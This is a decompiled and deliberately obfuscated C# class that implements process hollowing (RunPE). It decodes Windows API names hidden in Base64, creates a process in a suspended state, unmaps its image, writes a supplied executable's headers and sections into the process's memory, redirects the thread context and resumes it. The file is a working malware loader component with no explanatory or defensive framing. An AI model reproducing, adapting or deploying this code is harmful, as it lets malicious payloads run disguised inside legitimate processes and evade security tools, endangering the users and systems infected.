using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns4;

internal sealed class Class24
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate1(string vqhgnxhvtgaixrkr, StringBuilder sfpleudarlvstvphxd, IntPtr opceqaenbxpkoyqjrx, IntPtr yletcelaqjwjnjixt, [MarshalAs(UnmanagedType.Bool)] bool soonufgywgkruuxdkj, int zqquneivrpwqncwjs, IntPtr ydfgwwtlcaycdbjgbgse, string vbjsaqfkuthodbrjh, byte[] bezzveiceppbdtpjvgvr, IntPtr[] wjqhztdqqfvihdnejqf);

	public delegate bool Delegate2(IntPtr skxaxwzisjyqiflcqjtz, IntPtr vtxceuzwsgnhcrkbsfrh, byte[] hbqpinezvrptngfqfkx, uint unexaspqvfrqgeiu, int dxuexfagacgrbvxohsh);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate3(IntPtr yndoerzhrcoyfexh, IntPtr tkgpprxflwbvtnkit, ref IntPtr gajudtehsfbihyjgxlby, int xjyoeulnvhdoizzfvt, ref IntPtr iljuhsatzgrbpaaylc);

	public delegate IntPtr Delegate4(IntPtr iqsebovyqdhwqbpfs, IntPtr xdiiqrxtbnwjzyurvdj, IntPtr xzohxargiyhzpnsovq, int oiypvloixyvqvvbn, int tksgnzvtpxizobuvsi);

	public delegate uint Delegate5(IntPtr rskufyftnnrxoggv, IntPtr pjplyockxlgiyqsd);

	public delegate uint Delegate6(IntPtr avojgvabofsqvffsjrpr);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate7(IntPtr fvtookancwfyduva, uint[] hjvyxexshckpfufon);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate8(IntPtr jefplkrbcsdjqydnwepz, uint[] ehlgzpcblholqlxyux);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}

	public static bool smethod_1(byte[] byte_0, string string_0)
	{
		Delegate1 @delegate = smethod_0<Delegate1>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
		Delegate7 delegate2 = smethod_0<Delegate7>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")));
		Delegate3 delegate3 = smethod_0<Delegate3>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
		Delegate4 delegate4 = smethod_0<Delegate4>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
		Delegate2 delegate5 = smethod_0<Delegate2>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")));
		Delegate8 delegate6 = smethod_0<Delegate8>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
		Delegate6 delegate7 = smethod_0<Delegate6>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")));
		Delegate5 delegate8 = smethod_0<Delegate5>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
		bool result;
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] bezzveiceppbdtpjvgvr = new byte[68];
				int num = BitConverter.ToInt32(byte_0, 60);
				int num2 = BitConverter.ToInt16(byte_0, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(byte_0, num + 84));
				if (@delegate(null, new StringBuilder(string_0), zero, zero, soonufgywgkruuxdkj: false, 4, zero, null, bezzveiceppbdtpjvgvr, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (delegate2(array[1], array2))
					{
						IntPtr tkgpprxflwbvtnkit = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr gajudtehsfbihyjgxlby = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr iljuhsatzgrbpaaylc = IntPtr.Zero;
						if (delegate3(array[0], tkgpprxflwbvtnkit, ref gajudtehsfbihyjgxlby, (int)intPtr2, ref iljuhsatzgrbpaaylc) && unchecked((long)delegate8(array[0], gajudtehsfbihyjgxlby)) == 0L)
						{
							IntPtr vtxceuzwsgnhcrkbsfrh = delegate4(xdiiqrxtbnwjzyurvdj: new IntPtr(BitConverter.ToInt32(byte_0, num + 52)), xzohxargiyhzpnsovq: new IntPtr(BitConverter.ToInt32(byte_0, num + 80)), iqsebovyqdhwqbpfs: array[0], oiypvloixyvqvvbn: 12288, tksgnzvtpxizobuvsi: 64);
							int num3 = vtxceuzwsgnhcrkbsfrh.ToInt32();
							int dxuexfagacgrbvxohsh = default(int);
							delegate5(array[0], vtxceuzwsgnhcrkbsfrh, byte_0, (uint)(int)intPtr, dxuexfagacgrbvxohsh);
							int num4 = num2 - 1;
							int num5 = num4;
							for (int i = 0; i <= num5; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(byte_0, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(byte_0, array3[5], array4, 0, array4.Length);
								delegate5(vtxceuzwsgnhcrkbsfrh: new IntPtr(num3 + array3[3]), unexaspqvfrqgeiu: (uint)(int)new IntPtr(array4.Length), skxaxwzisjyqiflcqjtz: array[0], hbqpinezvrptngfqfkx: array4, dxuexfagacgrbvxohsh: dxuexfagacgrbvxohsh);
							}
							delegate5(vtxceuzwsgnhcrkbsfrh: new IntPtr(unchecked((long)array2[41]) + 8L), unexaspqvfrqgeiu: (uint)(int)new IntPtr(4), skxaxwzisjyqiflcqjtz: array[0], hbqpinezvrptngfqfkx: BitConverter.GetBytes(vtxceuzwsgnhcrkbsfrh.ToInt32()), dxuexfagacgrbvxohsh: dxuexfagacgrbvxohsh);
							array2[44] = (uint)(vtxceuzwsgnhcrkbsfrh.ToInt32() + BitConverter.ToInt32(byte_0, num + 40));
							delegate6(array[1], array2);
						}
					}
					delegate7(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
				goto IL_0429;
			}
			return true;
		}
		IL_0429:
		return result;
	}
}
